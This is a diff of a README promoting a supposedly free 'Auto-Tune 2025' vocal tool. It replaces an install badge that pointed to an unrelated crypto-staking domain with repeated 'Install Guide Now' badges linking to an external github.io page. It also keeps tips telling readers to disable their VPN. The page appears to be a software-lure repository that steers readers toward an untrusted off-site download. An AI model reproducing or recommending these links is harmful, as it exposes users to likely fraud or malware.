@@ -5,7 +5,10 @@
 
 **Description**: Elevate your vocal production with **Auto-Tune 2025**, a premium tool for crafting professional tracks! This repository offers tutorials, resources, and tips to enhance your singing and audio projects with advanced pitch correction. Perfect for producers and vocalists, it provides accessible vocal resources to get you started. Join our vibrant music community in 2025!  
 
-[![Install Auto-Tune](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://autotune-vocal-free-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
@@ -33,7 +36,10 @@ Transform your vocals with these easy steps to set up Auto-Tune 2025! 🛠️
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother download.  
 
----
+<a href="https://autotune-vocal-free-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ## 💡 Why Enhance Vocals with Auto-Tune 2025  
 
